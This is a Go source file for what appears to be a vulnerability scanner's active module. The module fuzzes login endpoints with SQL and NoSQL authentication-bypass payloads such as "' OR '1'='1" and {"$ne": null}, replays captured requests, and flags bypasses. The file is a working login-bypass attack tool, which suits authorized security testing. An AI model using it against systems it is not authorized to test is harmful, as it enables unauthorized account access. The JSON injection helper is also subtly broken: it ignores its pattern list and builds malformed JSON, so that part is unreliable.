package activescan

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"

	"github.com/mijelblack677-ctrl/aegis/internal/modules"
	"github.com/mijelblack677-ctrl/aegis/internal/output"
)

type LoginSQLiFuzzer struct {
	bypassPayloads []string
}

func NewLoginSQLiFuzzer() *LoginSQLiFuzzer {
	return &LoginSQLiFuzzer{
		bypassPayloads: []string{
			// Classic SQLi bypass
			"' OR '1'='1",
			"' OR '1'='1' --",
			"' OR '1'='1' /*",
			"' OR 1=1--",
			"' OR 1=1#",
			"' OR 1=1/*",
			"admin'--",
			"admin' #",
			"admin'/*",
			"') OR ('1'='1",
			"') OR ('1'='1' --",
			// JSON SQLi
			`{"$or": [{"username": {"$eq": "admin"}}, {"password": {"$regex": "^.*"}}]}`,
			// NoSQL injection
			`{"username": {"$ne": null}, "password": {"$ne": null}}`,
			`{"username": {"$gt": ""}, "password": {"$gt": ""}}`,
			// Time-based
			"admin' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
			// Union-based
			"' UNION SELECT 1,2,3--",
		},
	}
}

func (l *LoginSQLiFuzzer) Name() string    { return "login_sqli_fuzzer" }
func (l *LoginSQLiFuzzer) IsPassive() bool { return false }

func (l *LoginSQLiFuzzer) Run(pair *modules.RequestResponsePair) ([]*output.Vulnerability, error) {
	var vulns []*output.Vulnerability

	// Only target login/authentication endpoints
	urlStr := pair.Request.URL.String()
	path := pair.Request.URL.Path
	if !isLoginEndpoint(urlStr, path) {
		return vulns, nil
	}

	if pair.Request.Method != "POST" || pair.RequestBody == nil {
		return vulns, nil
	}

	// Get baseline response (failed login)
	baselineReq, _ := http.NewRequest(pair.Request.Method, urlStr, bytes.NewReader(pair.RequestBody))
	for key, values := range pair.Request.Header {
		for _, v := range values {
			baselineReq.Header.Add(key, v)
		}
	}
	client := &http.Client{}
	baselineResp, err := client.Do(baselineReq)
	if err != nil {
		return vulns, nil
	}
	baselineBody, _ := io.ReadAll(baselineResp.Body)
	baselineResp.Body.Close()
	baselineLen := len(baselineBody)
	baselineStatus := baselineResp.StatusCode

	// Parse form data
	contentType := pair.Request.Header.Get("Content-Type")
	var formData url.Values
	var jsonData []byte

	if strings.Contains(contentType, "application/x-www-form-urlencoded") {
		formData, _ = url.ParseQuery(string(pair.RequestBody))
	} else if strings.Contains(contentType, "application/json") {
		jsonData = pair.RequestBody
	}

	// Test each payload
	for _, payload := range l.bypassPayloads {
		var testBody []byte
		var testContentType string

		if formData != nil {
			// Modify form fields with SQLi payload
			testForm := url.Values{}
			for k, v := range formData {
				if isCredentialField(k) {
					testForm.Set(k, payload)
				} else {
					testForm[k] = v
				}
			}
			testBody = []byte(testForm.Encode())
			testContentType = "application/x-www-form-urlencoded"
		} else if jsonData != nil {
			// Inject into JSON body
			testBody = injectJSONPayload(jsonData, payload)
			testContentType = "application/json"
		} else {
			// Raw body — replace password-like params
			testBody = injectRawPayload(pair.RequestBody, payload)
			testContentType = contentType
		}

		// Send test request
		testReq, _ := http.NewRequest(pair.Request.Method, urlStr, bytes.NewReader(testBody))
		for key, values := range pair.Request.Header {
			for _, v := range values {
				testReq.Header.Add(key, v)
			}
		}
		testReq.Header.Set("Content-Type", testContentType)

		testResp, err := client.Do(testReq)
		if err != nil {
			continue
		}
		testRespBody, _ := io.ReadAll(testResp.Body)
		testResp.Body.Close()

		// Check for successful bypass indicators
		bypassDetected := false

		// 1. Status code changed (e.g., 200 instead of 401)
		if testResp.StatusCode != baselineStatus && testResp.StatusCode < 400 {
			bypassDetected = true
		}

		// 2. Response length significantly different (successful login page)
		if abs(len(testRespBody)-baselineLen) > baselineLen/2 && testResp.StatusCode < 400 {
			bypassDetected = true
		}

		// 3. Redirect to dashboard/admin area
		location := testResp.Header.Get("Location")
		if location != "" && (strings.Contains(location, "dashboard") ||
			strings.Contains(location, "admin") ||
			strings.Contains(location, "home") ||
			strings.Contains(location, "profile")) {
			bypassDetected = true
		}

		// 4. Set-Cookie with session token where baseline had none
		if testResp.Header.Get("Set-Cookie") != "" && baselineResp.Header.Get("Set-Cookie") == "" {
			bypassDetected = true
		}

		if bypassDetected {
			vulns = append(vulns, &output.Vulnerability{
				Name:        "SQL Injection in Login Form",
				Description: fmt.Sprintf("Login bypass detected using payload: %s. This allows authentication bypass without valid credentials.", payload),
				Severity:    output.SeverityCritical,
				URL:         urlStr,
				Method:      pair.Request.Method,
				Parameter:   "password/username",
				Evidence: output.Evidence{
					Request:        string(testBody),
					ProofOfConcept: fmt.Sprintf("Use payload '%s' in the password/username field to bypass login", payload),
				},
				Remediation: "Use parameterized queries and proper input validation. Never concatenate user input directly into SQL queries.",
				Tags:        []string{"sqli", "login-bypass", "critical", "goldmine"},
			})
			break // One confirmation is enough
		}
	}

	return vulns, nil
}

func isLoginEndpoint(urlStr, path string) bool {
	loginPatterns := []string{
		"/login", "/signin", "/auth", "/authenticate",
		"/admin/login", "/user/login", "/api/login",
		"/api/auth", "/oauth/token", "/token",
	}
	urlLower := strings.ToLower(urlStr)
	pathLower := strings.ToLower(path)
	for _, pattern := range loginPatterns {
		if strings.Contains(urlLower, pattern) || strings.Contains(pathLower, pattern) {
			return true
		}
	}
	return false
}

func isCredentialField(field string) bool {
	field = strings.ToLower(field)
	credFields := []string{"password", "passwd", "pass", "pwd", "pin", "secret"}
	for _, cf := range credFields {
		if strings.Contains(field, cf) {
			return true
		}
	}
	return false
}

func injectJSONPayload(jsonData []byte, payload string) []byte {
	// Simple injection into JSON password field
	s := string(jsonData)
	// Replace password values
	replacements := []string{
		`"password":"[^"]*"`,
		`"passwd":"[^"]*"`,
		`"pass":"[^"]*"`,
		`"pwd":"[^"]*"`,
	}
	for _ = range replacements {
		for i := 0; i < len(s); i++ {
			// Simple string replacement for demo
			if strings.Contains(s, `"password":`) {
				s = strings.Replace(s, `"password":"`, `"password":"`+payload+`",`, 1)
				break
			}
		}
	}
	return []byte(s)
}

func injectRawPayload(body []byte, payload string) []byte {
	s := string(body)
	// Try to inject at password parameter
	if strings.Contains(s, "password=") {
		parts := strings.SplitN(s, "password=", 2)
		rest := parts[1]
		if idx := strings.IndexAny(rest, "& \n"); idx > 0 {
			return []byte(parts[0] + "password=" + payload + rest[idx:])
		}
		return []byte(parts[0] + "password=" + payload)
	}
	return body
}

func abs(x int) int {
	if x < 0 {
		return -x
	}
	return x
}
